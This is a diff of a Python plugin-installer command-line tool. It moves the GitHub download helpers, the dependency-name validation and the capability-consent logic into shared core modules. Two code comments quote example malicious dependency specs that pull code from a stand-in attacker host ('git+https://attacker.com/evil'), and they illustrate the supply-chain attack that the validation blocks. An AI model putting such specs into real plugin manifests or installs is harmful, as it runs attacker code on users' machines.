@@ -21,9 +21,7 @@ which ``security.allowed_modules`` the user accepted.
 from __future__ import annotations
 
 import argparse
-import json
 import os
-import re
 import shutil
 import subprocess
 import sys
@@ -52,8 +50,17 @@ from app.core.plugin_loader import (
     save_lockfile,
 )
 from app.core.plugins import catalog as core_catalog
+from app.core.plugins import consent as core_consent
+from app.core.plugins import deps as core_deps
+from app.core.plugins import github as core_github
 from app.core.plugins import sources as core_sources
-from app.core.plugins.errors import UnknownCatalogName, UnparseableSource
+from app.core.plugins.errors import (
+    ConsentRequired,
+    GitHubError,
+    PluginInstallError,
+    UnknownCatalogName,
+    UnparseableSource,
+)
 # The rules live in ``app.core.plugins`` so that the server can read them too;
 # what follows is this module keeping the names it has always exported. The
 # ``X as X`` spelling on the ones this file never calls itself is the
@@ -312,52 +319,18 @@ def parse_source(spec: str) -> tuple[str, str, str, str]:
 
 
 # ── GitHub helpers ─────────────────────────────────────────────────────────
+#
+# Plain re-exports, not wrappers: the request rules (the token header, the two
+# shapes of failure, the size cap) live in ``app.core.plugins.github`` so the
+# server obeys them too. They keep their names here because these are the
+# attributes the install tests replace to stay off the network -- patching
+# ``plugins.resolve_sha`` has to be what ``_install_github`` calls.
 
-USER_AGENT = "cdui-plugin-installer/0.1"
-MAX_TARBALL_BYTES = 100 * 1024 * 1024  # 100 MB
-
-
-def _gh_get(url: str, timeout: float = 30.0) -> bytes:
-    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
-    with urllib.request.urlopen(req, timeout=timeout) as resp:
-        return resp.read()
-
-
-def resolve_sha(owner: str, repo: str, ref: str) -> str:
-    """Convert tag / branch / short-sha to a full 40-char SHA."""
-    target = ref or "HEAD"
-    url = f"https://api.github.com/repos/{owner}/{repo}/commits/{target}"
-    try:
-        data = json.loads(_gh_get(url))
-    except HTTPError as e:
-        raise RuntimeError(
-            f"GitHub API returned {e.code} for {owner}/{repo}@{target}: {e.reason}"
-        ) from e
-    except URLError as e:
-        raise RuntimeError(f"GitHub API request failed: {e.reason}") from e
-    sha = data.get("sha")
-    if not sha:
-        raise RuntimeError(
-            f"GitHub API response for {owner}/{repo}@{target} is missing 'sha'"
-        )
-    return sha
-
-
-def download_tarball(owner: str, repo: str, sha: str, dest: Path) -> None:
-    url = f"https://codeload.github.com/{owner}/{repo}/tar.gz/{sha}"
-    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
-    bytes_read = 0
-    with urllib.request.urlopen(req, timeout=60.0) as resp, dest.open("wb") as fout:
-        while True:
-            chunk = resp.read(64 * 1024)
-            if not chunk:
-                break
-            bytes_read += len(chunk)
-            if bytes_read > MAX_TARBALL_BYTES:
-                raise RuntimeError(
-                    f"Tarball exceeds {MAX_TARBALL_BYTES // (1024 * 1024)} MB limit."
-                )
-            fout.write(chunk)
+USER_AGENT = core_github.USER_AGENT
+MAX_TARBALL_BYTES = core_github.MAX_TARBALL_BYTES
+_gh_get = core_github._gh_get
+resolve_sha = core_github.resolve_sha
+download_tarball = core_github.download_tarball
 
 
 # ── runtime helpers ────────────────────────────────────────────────────────
@@ -445,48 +418,14 @@ def _backend_reload() -> bool:
         return False
 
 
-# PEP 508 distribution names: letters / digits / underscore / hyphen / period.
-# Anything else (especially ``@``, ``git+``, ``http``, whitespace, semicolon)
-# is rejected to block supply-chain RCE via the dep installer
-# (``"evil @ git+https://attacker.com/evil"`` → ``uv pip install`` runs the
-# attacker's ``setup.py`` regardless of how strict the AST gate is).
-_SAFE_DEP_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,62}$")
-
-# PEP 440 version specifier characters. We don't fully parse — we just refuse
-# anything that *isn't* whitespace, digits, dots, commas, parens, and the
-# canonical comparison operators.
-_SAFE_DEP_VERSION = re.compile(r"^[\s\d.,()<>=!~*+a-zA-Z\-]*$")
-
-
-class _UnsafeDepSpec(ValueError):
-    """Raised when a plugin manifest's python_deps entry isn't a plain
-    distribution name + version constraint."""
-
-
-def _build_dep_spec(name: str, ver: str) -> str:
-    """Turn a (name, version) pair into a vetted ``foo==1.2.3``-style string.
-
-    Rejects PEP 508 extras (``foo[extra]``), URL specifiers (``foo @ url``),
-    and any name with non-distribution-safe characters. Returning the spec as
-    a list element for ``uv pip install`` is safe because we never invoke a
-    shell — but ``uv`` itself would happily fetch ``git+`` URLs given the
-    chance, and that's exactly what we're blocking here.
-    """
-    if not isinstance(name, str) or not _SAFE_DEP_NAME.match(name):
-        raise _UnsafeDepSpec(
-            f"Invalid python_deps name {name!r} — must match {_SAFE_DEP_NAME.pattern!r}"
-        )
-    if not isinstance(ver, str):
-        ver = ""
-    if ver and not _SAFE_DEP_VERSION.match(ver):
-        raise _UnsafeDepSpec(
-            f"Invalid python_deps version constraint for {name!r}: {ver!r}"
-        )
-    if not ver:
-        return name
-    if ver[:1] in (">", "<", "=", "~", "!"):
-        return f"{name}{ver}"
-    return f"{name}=={ver}"
+# The vetting that keeps a manifest's ``[python_deps]`` from becoming
+# ``uv pip install git+https://attacker.example/evil``; the rule and its
+# reasoning live in ``app.core.plugins.deps``. Re-exported under the names
+# this module has always had.
+_SAFE_DEP_NAME = core_deps._SAFE_DEP_NAME
+_SAFE_DEP_VERSION = core_deps._SAFE_DEP_VERSION
+_UnsafeDepSpec = core_deps._UnsafeDepSpec
+_build_dep_spec = core_deps._build_dep_spec
 
 
 def _install_deps(deps: dict[str, str]) -> int:
@@ -500,13 +439,11 @@ def _install_deps(deps: dict[str, str]) -> int:
     fail with "No virtual environment found". Pinning ``--python`` removes the
     cwd dependency.
     """
-    specs: list[str] = []
-    for name, ver in deps.items():
-        try:
-            specs.append(_build_dep_spec(name, ver))
-        except _UnsafeDepSpec as e:
-            err(str(e), str(e))
-            return 1
+    try:
+        specs = core_deps.dep_specs(deps)
+    except PluginInstallError as e:
+        err(str(e), str(e))
+        return 1
     cmd = ["uv", "pip", "install", "--python", sys.executable, *specs]
     info(
         f"執行：{' '.join(cmd)}",
@@ -566,6 +503,11 @@ def capability_gate(
     The declared set is checked against this build's vocabulary first;
     ``validate_manifest`` already refuses an unknown name, so reaching one
     here means a caller skipped it, and refusing is the safe reading.
+
+    Which capabilities are covered, and which are new since the version the
+    user consented to, is :func:`app.core.plugins.consent.decide_capabilities`
+    -- the same arithmetic a dialog will do. What is here is the
+    conversation: the printing, the prompt, and the refusal.
     """
     requested = manifest_capabilities(manifest)
     if not requested:
@@ -581,11 +523,15 @@ def capability_gate(
         )
         return CAPABILITIES_REFUSED
 
-    prior = set(normalize_capabilities(getattr(args, "prior_capabilities", None)))
-    if set(requested) <= prior:
+    # ``None`` rather than an empty tuple when there is no record: "installed
+    # before and granted nothing" and "never installed" differ, and only the
+    # first makes an unchanged request into growth worth warning about.
+    prior = normalize_capabilities(getattr(args, "prior_capabilities", None))
+    decision = core_consent.decide_capabilities(requested, prior=prior or None)
+    if not decision.missing:
         info(
-            f"沿用先前授權的能力：{', '.join(requested)}",
-            f"Re-using previously granted capabilities: {', '.join(requested)}",
+            f"沿用先前授權的能力：{', '.join(decision.granted)}",
+            f"Re-using previously granted capabilities: {', '.join(decision.granted)}",
         )
         return requested
 
@@ -597,11 +543,9 @@ def capability_gate(
         "A capability is a declaration, not a sandbox: once granted, the "
         "plugin may use that group of modules and CodefyUI stops asking.",
     )
-    if prior:
-        warn(
-            f"這次比上次多要了：{', '.join(sorted(set(requested) - prior))}",
-            f"This is more than last time: {', '.join(sorted(set(requested) - prior))}",
-        )
+    if decision.grew:
+        grew = ", ".join(sorted(decision.grew))
+        warn(f"這次比上次多要了：{grew}", f"This is more than last time: {grew}")
 
     if getattr(args, "accept_capabilities", False):
         ok(
@@ -797,17 +741,10 @@ def _install_github(owner: str, repo: str, ref: str, args, lockfile) -> int:
         extracted = Path(tmpd) / "extracted"
         extracted.mkdir()
         try:
-            with tarfile.open(tar, "r:gz") as tf:
-                tf.extractall(extracted, filter="data")
-        except tarfile.TarError as e:
+            root = core_github.extract_tarball(tar, extracted)
+        except (tarfile.TarError, PluginInstallError) as e:
             err(f"解壓失敗：{e}", f"Extraction failed: {e}")
             return 1
-
-        roots = [p for p in extracted.iterdir() if p.is_dir()]
-        if not roots:
-            err("壓縮檔內容為空", "Tarball is empty")
-            return 1
-        root = roots[0]
 
         try:
             manifest = read_manifest(root)
@@ -827,10 +764,14 @@ def _install_github(owner: str, repo: str, ref: str, args, lockfile) -> int:
 
         plugin_id = manifest["plugin"]["id"]
         allowed = manifest.get("security", {}).get("allowed_modules") or []
-        if allowed and not args.trust_author:
+        try:
+            core_consent.check_trust(allowed, trust_author=args.trust_author)
+        except ConsentRequired as e:
+            asked = ", ".join(e.allowed_modules)
             err(
-                f"外掛要求白名單以外的模組：{', '.join(allowed)}。加 --trust-author 同意。",
-                f"Plugin requests non-default modules: {', '.join(allowed)}. Pass --trust-author to accept.",
+                f"外掛要求白名單以外的模組：{asked}。加 --trust-author 同意。",
+                f"Plugin requests non-default modules: {asked}. "
+                f"Pass --trust-author to accept.",
             )
             return 1
 
@@ -1603,10 +1544,10 @@ def cmd_info(args: argparse.Namespace) -> int:
     except RuntimeError as e:
         err(str(e), str(e))
         return 1
-    raw = f"https://raw.githubusercontent.com/{owner}/{repo}/{sha}/cdui.plugin.toml"
     try:
-        manifest = tomllib.loads(_gh_get(raw).decode("utf-8"))
-    except (HTTPError, URLError, tomllib.TOMLDecodeError, UnicodeDecodeError) as e:
+        manifest = tomllib.loads(core_github.fetch_manifest_text(owner, repo, sha))
+    except (GitHubError, tomllib.TOMLDecodeError, UnicodeDecodeError) as e:
+        raw = f"https://raw.githubusercontent.com/{owner}/{repo}/{sha}/{MANIFEST_FILENAME}"
         err(f"無法取得 manifest：{e}", f"Could not fetch manifest from {raw}: {e}")
         return 1
     synthetic_entry = {
